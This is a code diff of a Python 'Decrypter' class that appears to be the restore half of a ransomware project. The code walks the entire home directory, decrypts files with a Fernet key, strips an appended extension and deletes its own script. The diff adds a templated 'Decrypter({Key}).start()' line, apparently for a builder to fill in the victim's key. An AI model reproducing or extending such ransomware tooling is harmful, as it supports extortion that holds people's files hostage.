@@ -1,15 +1,11 @@
-from cryptography.fernet import Fernet
 import os
+from cryptography.fernet import Fernet
 from pathlib import Path
 
-# from .new import change_extension
-
 class Decrypter:
-    def __init__(self) -> None:
+    def __init__(self,key) -> None:
         self.home_dir = str(Path.home())
-    def key(self):
-        with open('key.txt','rb') as file:
-            self.key = file.read()
+        self.key = key
 
     def decrypt_file(self,file):
         with open(file,'rb')as file_read:
@@ -23,11 +19,11 @@ class Decrypter:
             file_write.close()
 
     def change_extension(self,file):
-        extension =file.split('.')[-2]
+        extension = file.split('.')[-2]
         new_name = file.replace(f".{extension}",'')
         os.rename(file,new_name)
 
-    def start(self,files):
+    def start(self):
         for rootdir, dirs, files in os.walk(self.home_dir):
             for subdir in dirs:
                 dir = os.path.join(rootdir, subdir)
@@ -42,3 +38,4 @@ class Decrypter:
                     continue        
         os.remove(os.path.basename(__file__))
 
+Decrypter({Key}).start()
